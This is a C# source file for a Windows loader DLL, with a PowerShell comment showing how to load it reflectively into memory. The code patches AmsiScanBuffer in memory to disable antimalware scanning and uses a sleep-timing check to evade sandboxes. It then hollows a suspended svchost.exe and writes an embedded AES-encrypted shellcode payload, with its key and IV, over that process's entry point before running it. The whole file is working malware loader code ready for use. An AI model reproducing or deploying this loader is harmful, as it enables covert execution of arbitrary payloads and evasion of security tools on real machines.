/*
$dll = "C:\...\DLLProcessHollowing.dll"
$bytes = [System.IO.File]::ReadAllBytes($dll)
[System.Reflection.Assembly]::Load($bytes)
[DLLProcessHollowing.Main]::run()
*/

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace DLLProcessHollowing
{
    public class Main
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        private struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        private static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
        );

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(
            IntPtr hProcess,
            int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen,
            ref uint retlen
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead
        );

        [DllImport("kernel32.dll")]
        private static extern bool WriteProcessMemory(
             IntPtr hProcess,
             IntPtr lpBaseAddress,
             byte[] lpBuffer,
             Int32 nSize,
             out IntPtr lpNumberOfBytesWritten
         );


        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        private static extern void Sleep(uint dwMilliseconds);

        private static byte[] PerformCryptography(byte[] buf, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(buf, 0, buf.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }

        public static byte[] Decrypt(byte[] buf, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.Zeros;
                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(buf, decryptor);
                }
            }
        }

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        private static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

        public static void AmsiPatch()
        {
            IntPtr TargetDLL = LoadLibrary("amsi.dll");
            if (TargetDLL == IntPtr.Zero)
            {
                return;
            }

            IntPtr AmsiScanBufrPtr = GetProcAddress(TargetDLL, "AmsiScanBuffer");
            if (AmsiScanBufrPtr == IntPtr.Zero)
            {
                return;
            }

            UIntPtr dwSize = (UIntPtr)4;
            uint Zero = 0;
            if (!VirtualProtect(AmsiScanBufrPtr, dwSize, 0x40, out Zero))
            {
                return;
            }

            Byte[] Patch = { 0x31, 0xff, 0x90 };
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(Patch, 0, unmanagedPointer, 3);
            MoveMemory(AmsiScanBufrPtr + 0x001b, unmanagedPointer, 3);

            return;
        }

        public static void run()
        {
            AmsiPatch();

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            string finalPayload = "E/APFvH8m+eL2+w/z2ee1s1FijT1eoQaMWCed3SjPQo9KSEEXtpj6J121N7kjKElastemCn+7J3I/Vm2finUbJE5NMMoZ9IdoLUHdaLAGu05lVLVjkH6hugeav7zRd0R9kb9pcW/XiL+4qfob/sfHfb1TOIhjgzmRgYeH6YW5DzTHs9aonr97DB864EN9rCoeeWYG13PP5tryVgao86AtE9L9Bw7K6AcUtCRuzTgZfqdFo2tpaVRpELzEn6NWeLQfr+25k9uDaDKr/bChtyTdzxa09ppHZVRqJDzFZo14hNdJD1MiUfR7OwrKvZ+YQRrJ2cr2XoJ5a3NOhqkKtKOUDo2t52kLVk9m8SM36YR8kGA5uWACfZyegJPZNxi+lvhraRoHistz3xuroHAf+U7FTkKTW1c2FF62ivhDsI9hggkTCnp85tislGYfRMLaZkuGt1JYt8nBE839OCWVstPYWCN1PxmwuI/TbSKBfBNYE2FIqVWToCCrcHu42yX4uZdLiZJ7vU4361pSqWLc4ncOiGEf36CtTESmxCyhlmgh0Zp+kRD31On9WGBqeHs7RWGzG54RLcPbNWjTzGCXz1CrsMDNEeQ2xh1VsR1cV1ZVqbXCgr6h0NcPYP/grTYeG9Sqq+cla39F2AU0pai20492vOBrMkYyPSedTQvyOtPbjixvrhj4ohpTIS1xi7p/K2NvAVyOcURZJsnpXhDHts1iJWxee/227iNlY04bQiY5dVD9ZWkX/7UVo5vjG5m6XmAj+BHwB/im4YpiLQ62PGRTkUNUzbkkv1l3DvTMgbGxAOq2LJPi94uCnitg45wFyHCxDTw9otvuD3jqVkkSt7ab7YE+4yCe1ACBKuSBGVClNBGXPlQlRiY6/RuBsvAtDTqmVecL76ApA1donG5tbOjlPoF8y8IDf8Dp5zOYA4KnyCg2vlNWKRkLg/zKdw+mlA07/rumdzRyQStTdaGjHuCrbLsOPZWi0Pzh8jCZKKlOtnXe09Xh1QNDXW/5FOnWzZpS+OyPUZB1RV0nGqet/TuD6YUQboLVdSFSZx4/rv7ktOScRc9xxsIJ/SIpGInV24K";
            byte[] key = new byte[32] { 0xc9, 0x9d, 0x0e, 0x54, 0xb9, 0x3f, 0x87, 0xc4, 0x8d, 0x5b, 0xc7, 0x4c, 0x0a, 0x31, 0x7f, 0xd6, 0x5b, 0x04, 0x07, 0x48, 0x80, 0x94, 0x09, 0x27, 0xc6, 0x60, 0x63, 0x16, 0xdd, 0x07, 0xe7, 0x9b };
            byte[] iv = new byte[16] { 0xe8, 0xb5, 0xa6, 0xde, 0xae, 0x8c, 0x29, 0x51, 0xd7, 0x28, 0xf9, 0x22, 0x5d, 0xb3, 0xda, 0xa0 };
            byte[] decrypted_data = Decrypt(Convert.FromBase64String(finalPayload), key, iv);

            WriteProcessMemory(hProcess, addressOfEntryPoint, decrypted_data, decrypted_data.Length, out nRead);

            ResumeThread(pi.hThread);
        }
    }
}